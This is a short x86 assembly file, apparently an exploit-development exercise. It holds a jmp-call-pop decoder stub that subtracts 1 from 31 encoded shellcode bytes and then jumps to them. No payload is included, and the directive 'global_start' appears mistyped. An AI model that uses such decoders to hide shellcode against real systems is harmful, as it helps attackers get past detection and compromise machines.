[SECTION .text]

global_start

_start:
    
    jmp short initialize

handlemySC:

    pop esi
    xor ecx, ecx
    mov cl, 31                      ; shellcode size

decode:

    sub byte [esi + ecx - 1], 1
    sub cl, 1
    jnz decode
    jmp short execmySC

initialize:

    call handlemySC

execmySC:
